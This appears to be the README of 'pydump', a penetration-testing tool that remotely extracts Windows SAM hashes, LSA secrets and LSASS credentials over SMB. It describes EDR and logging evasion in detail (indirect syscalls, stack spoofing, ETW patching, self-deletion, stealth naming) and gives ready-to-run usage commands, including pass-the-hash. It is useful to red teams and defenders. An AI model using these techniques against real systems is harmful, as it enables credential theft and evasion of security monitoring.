# pydump

Remote Windows credential extraction over SMB — SAM/LSA secrets + LSASS memory dump.

Zero external tool dependencies. No impacket, no nxc, no lsassy.

## Features

- **SAM hashes** — raw NTFS disk read of hive files + AES/DES decrypt (verified against nxc)
- **LSA secrets** — DPAPI keys, service passwords, NL$KM
- **LSASS dump** — pointer-following memory read via indirect syscalls, EDR-evasive SCM failure action delivery
- **LSASS parser** — custom MDMP parser, MSV1.0 (NTLM) + WDigest extraction
- **Disk module injection** — lsasrv.dll .text loaded from disk via SMB for pattern scanning (no LSASS .text read)
- **Pass-the-Hash** — `-H` flag, no password needed

## How it works

pydump deploys a lightweight native agent (~12KB, x64) on the target. The agent
performs **all privileged operations** locally using only NT syscalls:

### Registry hives (--sam, --lsa)

Opens the raw `\\.\C:` volume and parses NTFS structures (boot sector, MFT,
directory indexes, data runs) to read SAM/SYSTEM/SECURITY hive files directly
from disk clusters — bypasses kernel file locks and EDR file filters. Agent
executed via Task Scheduler (MS-TSCH RPC, avoids Event 7045).

### LSASS memory (--lsass)

Two-stage SCM failure action mechanism:

1. **Service stub** — agent registers as a Windows service (mode 16), reaches
   `SERVICE_RUNNING` via proper service protocol, then exits with error code 1
2. **Failure action** — SCM detects the "crash" and spawns the real dump command
   as a LOCAL process (created by `services.exe`), not a remote RPC child

The dump itself uses a **pointer-following** approach instead of a full
MiniDumpWriteDump:

1. Reads only lsasrv's `.data` section (~40KB) from LSASS memory
2. Follows key handle pointers to read AES/3DES BCrypt key structures (~512B each)
3. Walks the LogonSession hash table (32 buckets, Flink chains) to read session
   entries, usernames, domains, and encrypted credential blobs
4. Total LSASS reads: **~700KB in ~180 NtReadVirtualMemory calls** — stays well
   under EDR byte/call thresholds that trigger `minidumpwritedump_rpm_terminate.2`

The Python orchestrator then injects lsasrv.dll's `.text` section from disk
(read via SMB) as a synthetic memory segment — provides pattern signatures for
the credential extractor without ever touching LSASS `.text` in memory. On x64,
`.text` is identical on disk and in memory (RIP-relative addressing, no fixups).

### Exfiltration

Output streamed through a temp file on disk, XOR-encrypted with the output name
as a rolling key. Self-deletes from disk via ADS rename + `FileDispositionInfo`
before exiting.

## Architecture

```
ORCHESTRATOR (Linux/Python)                   TARGET (Windows)
┌──────────────────────┐         SMB 445      ┌──────────────────────┐
│  pydump CLI          │◄────────────────────►│                      │
│                      │                      │                      │
│  ┌─ agent output ──┐ │   upload agent.exe   │  ┌─────────────────┐ │
│  │ XOR decrypt     │ │─────────────────────►│  │ agent.exe       │ │
│  │ hives → decrypt │ │                      │  │ NT syscalls     │ │
│  │ LSASS → parse   │ │  TSCH → sched. task  │  │ raw NTFS reads  │ │
│  └─────────────────┘ │  (hives)             │  └────────┬────────┘ │
│                      │                      │           │          │
│  ┌─ disk inject ───┐ │  SVCCTL → failure    │  ┌────────▼────────┐ │
│  │ lsasrv.dll .text│ │  action (LSASS)      │  │ services.exe    │ │
│  │ via SMB read    │ │                      │  │ → agent.exe     │ │
│  └─────────────────┘ │◄─────────────────────│  │ (LOCAL process) │ │
│                      │ XOR-encrypted output │  └─────────────────┘ │
└──────────────────────┘                      └──────────────────────┘
```

### Project structure

```
pydump/                 Python orchestrator
├── cli.py              CLI + disk module injection (lsasrv.dll via SMB)
├── smb.py              SMB session, named pipes, file I/O
├── rpc/
│   ├── core.py         DCE/RPC bind/request (bare + PKT_PRIVACY sealed)
│   ├── ndr.py          NDR encoding
│   ├── ntlm.py         NTLMv2 auth + seal/unseal (no impacket)
│   ├── svcctl.py       Service Control Manager (service stub + failure actions)
│   ├── tsch.py         Task Scheduler (hive agent execution, avoids Event 7045)
│   └── winreg.py       Windows Remote Registry RPC
├── secrets/
│   ├── hivereader.py   Custom REGF hive parser
│   ├── crypto.py       Boot key, SAM/LSA AES/DES/RC4 decrypt
│   └── registry.py     SAM + LSA orchestration
├── dump/
│   └── methods.py      Agent deployment, SCM failure action, XOR decrypt
└── parser/
    ├── minidump.py     MDMP format parser
    └── extract.py      Credential extraction (MSV1.0, WDigest)

agent/                  ~12KB x64 PE, MinGW cross-compiled
├── src/
│   ├── main.c          Entry, service stub (mode 16), self-delete
│   ├── syscalls.c      Hell's Gate SSN resolution, ETW patch
│   ├── syscalls_gas.S  Indirect syscall stubs (GAS, 4 variants by arg count)
│   ├── syscalls.asm    Indirect syscall stubs (MASM, for MSVC builds)
│   ├── registry.c      Hive file reading — raw NTFS volume access
│   ├── ntfs.c          NTFS parser — boot sector, MFT, indexes, data runs
│   ├── dump.c          Pointer-following LSASS dump → MDMP stream
│   └── pipe.c          Named pipe server, restricted DACL, XOR cipher
└── include/
    ├── syscalls.h      DJB2 hash constants, syscall table
    ├── ntfs.h          Raw NTFS reader API
    ├── agent.h         MDMP structures
    └── ntdefs.h        NT type definitions, ACL/ACE structs
```

## Installation

```bash
virtualenv env && source env/bin/activate
pip install -r requirements.txt

# Build agent (requires x86_64-w64-mingw32-gcc)
cd agent && make cross
```

Dependencies: `smbprotocol` + `pycryptodome`.

## Usage

Three flags, combine as needed:

| Flag | What it does |
|---|---|
| `--sam` | Extract SAM hashes (local NTLM) |
| `--lsa` | Extract LSA secrets (DPAPI, service passwords) |
| `--lsass` | Dump + parse LSASS memory (live credentials) |

```bash
python main.py -t 10.0.0.5 -u admin -p pass --sam
python main.py -t 10.0.0.5 -u admin -p pass --lsa
python main.py -t 10.0.0.5 -u admin -p pass --lsass
python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa
python main.py -t 10.0.0.5 -u admin -p pass --sam --lsass
python main.py -t 10.0.0.5 -u admin -p pass --lsa --lsass
python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass

# Pass-the-Hash
python main.py -t 10.0.0.5 -u admin -H aad3b4...ef40 --sam --lsa
```

At least one flag is required. Order doesn't matter.

## Agent internals

| Technique | Detail |
|---|---|
| Indirect syscalls | SSN resolved via Hell's Gate / Halo's Gate from ntdll PEB walk |
| Call stack spoofing | Synthetic ntdll return frame — `sub rsp,8` + `ret` gadget at [rsp] creates a double-ret chain through ntdll, masking the real caller |
| Stub variants | 4 asm stubs (0/2/7/10 stack shifts) matching NT arg counts — prevents stack corruption |
| API hashing | All Nt* exports resolved by DJB2 hash — zero plaintext function names |
| Pointer-following dump | Reads only lsasrv .data + specific heap addresses — ~700KB / ~180 calls vs ~50MB for full MiniDumpWriteDump |
| Disk module injection | lsasrv.dll .text from disk provides pattern signatures — no LSASS .text memory read needed |
| SCM failure action | Service stub exits with error → SCM spawns dump agent as LOCAL process (created by services.exe) |
| NtGetNextProcess | Handle acquisition without CLIENT_ID — no NtOpenProcess on LSASS |
| Raw NTFS reads | Hive files read from raw disk clusters — bypasses kernel file locks, DACLs, and EDR file filters |
| Pure NT syscalls | No Win32 API — registry, pipes, files, all via Nt* syscalls |
| ETW patch | `EtwEventWrite` overwritten with `xor eax,eax; ret` via `NtProtectVirtualMemory` |
| Wire encryption | Rolling XOR cipher keyed on output name — no plaintext signatures on disk |
| Restricted DACL | Pipe access limited to SYSTEM + BUILTIN\Administrators (no NULL DACL) |
| Self-delete | ADS rename + `FileDispositionInfo` — binary removed before `ExitProcess` |
| PE hardening | `.comment` stripped, sections renamed, PE timestamp zeroed, `-fno-ident` |
| Frame pointer omission | `-fomit-frame-pointer` — RBP-based stack walkers cannot trace frames |
| TSCH execution | Hive agent launched via scheduled task (MS-TSCH RPC), not SVCCTL — avoids Event 7045 |
| Stealth naming | Task path/service/agent names mimic legitimate Windows components |
| No CRT | `-nostdlib -nostartfiles`, ~12KB binary |

## Requirements

- Python >= 3.11
- Admin credentials on target (password or NT hash)
- SMB port 445 open

## Disclaimer

This tool is designed for IT forensics and authorized credential auditing on systems you own or manage. Unauthorized use on third-party systems is illegal.
